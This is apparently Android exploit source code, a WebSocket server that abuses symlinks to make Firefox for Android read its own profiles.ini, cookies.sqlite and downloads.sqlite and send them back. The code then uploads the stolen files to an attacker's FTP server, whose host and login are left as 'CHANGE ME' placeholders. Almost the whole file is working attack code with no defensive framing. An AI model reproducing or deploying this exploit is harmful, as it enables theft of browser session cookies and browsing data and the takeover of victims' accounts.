package com.example.ffoxnew;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.UnknownHostException;

import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;
import org.java_websocket.WebSocket;
import org.java_websocket.handshake.ClientHandshake;
import org.java_websocket.server.WebSocketServer;

import android.content.Context;
import android.os.AsyncTask;
import android.util.Base64;
import android.util.Log;

public class ContentReceiverServer extends WebSocketServer {

	private static final String TAG = ContentReceiverServer.class.getSimpleName();

	private Context mContext;
	
	private String lastSaltedValue = null;

	public ContentReceiverServer(int port, Context ctx) throws UnknownHostException {
		super(new InetSocketAddress(port));
		mContext = ctx.getApplicationContext();
	}

	public ContentReceiverServer(InetSocketAddress address, Context ctx) {
		super(address);
		mContext = ctx.getApplicationContext();
	}

	@Override
	public void onOpen(WebSocket conn, ClientHandshake handshake) {
		Log.d(TAG,"onOpen");
	}

	@Override
	public void onMessage(WebSocket conn, String message) {
		if (message.startsWith("sym")) {
			String firstPayloadPath = JSPayloads.getPathForPayload(mContext, JSPayloads.FIRST_PAYLOAD);
			Utils.SymLinks.replaceFileWithSymlink(Utils.Firefox.PATH_PROFILES_INI, firstPayloadPath);
			try {
				Thread.sleep(2000);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
			conn.send("msg1");
		} else if (message.startsWith("msg1")) {
			// profiles.ini received 8===D we parse it
			String firstPayloadPath = JSPayloads.getPathForPayload(mContext, JSPayloads.FIRST_PAYLOAD);
			Utils.SymLinks.removeStuff(firstPayloadPath);
			int startindex = message.indexOf("Path=");
			int endindex = message.indexOf(".default");
			String salt = message.substring(startindex + 5, endindex);
			Log.d(TAG, "got Salted value " + salt);
			lastSaltedValue = salt;
			String cookies = String.format(Utils.Firefox.PATH_COOKIES_FORMAT, lastSaltedValue);
			Utils.SymLinks.replaceFileWithSymlink(cookies, firstPayloadPath);
			try {
				Thread.sleep(2000);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
			conn.send("msg2");
		} else if (message.startsWith("msg2")) {
			// cookies.sqlite
			String firstPayloadPath = JSPayloads.getPathForPayload(mContext, JSPayloads.FIRST_PAYLOAD);
			Utils.SymLinks.removeStuff(firstPayloadPath);
			String realMessage = message.substring(4);
			Log.e(TAG, realMessage);

			FTPTask ftpTask = new FTPTask();

			ftpTask.execute(realMessage, lastSaltedValue + "-" + "cookies.sqlite");
			
			String downloads = String.format(Utils.Firefox.PATH_DOWNLOADS_FORMAT, lastSaltedValue);
			Utils.SymLinks.replaceFileWithSymlink(downloads, firstPayloadPath);
			
			try {
				Thread.sleep(2000);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
			conn.send("msg3");
			
		} else if (message.startsWith("msg3")) {
			// downloads.sqlite
			String firstPayloadPath = JSPayloads.getPathForPayload(mContext, JSPayloads.FIRST_PAYLOAD);
			Utils.SymLinks.removeStuff(firstPayloadPath);
			try {
				// we have finished here
				this.stop();
			} catch (IOException e) {
				e.printStackTrace();
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
			String realMessage = message.substring(4);
			Log.e(TAG, realMessage);

			FTPTask ftpTask = new FTPTask();

			ftpTask.execute(realMessage, lastSaltedValue + "-" + "dowloads.sqlite");

		}
	}

	@Override
	public void onClose(WebSocket conn, int code, String reason, boolean remote) {
		Log.d(TAG,"onClose");
	}

	@Override
	public void onError(WebSocket conn, Exception e) {
		Log.e(TAG,"onError " + e.getMessage());
		e.printStackTrace();
	}

	private class FTPTask extends AsyncTask<String, Void, Void> {

		@Override
		protected Void doInBackground(String... params) {
			// local copy
			byte[] bytes = Base64.decode(params[0], 0);
			File filesDir = mContext.getFilesDir();
			File output = new File(filesDir, params[1]);
			try {
				FileOutputStream os = new FileOutputStream(output, true);
				os.write(bytes);
				os.flush();
				os.close();
			} catch (Exception e) {
				Log.e(TAG, "Error while saving file");
			}

			FTPClient con = null;

			try
			{
				con = new FTPClient();
				con.connect("");	//CHANGE ME

				if (con.login("", ""))	// CHANGE ME
				{
					con.enterLocalPassiveMode(); // important!
					con.setFileType(FTP.BINARY_FILE_TYPE);

					FileInputStream in = new FileInputStream(output);
					
					boolean result = con.storeFile(params[1], in);
					in.close();
					if (result) Log.v("upload result", "succeeded");
					else Log.e("Upload result", "failed");
					con.logout();
					con.disconnect();
				}
			}
			catch (Exception e)
			{
				e.printStackTrace();
			}


			return null;
		}

	}


}
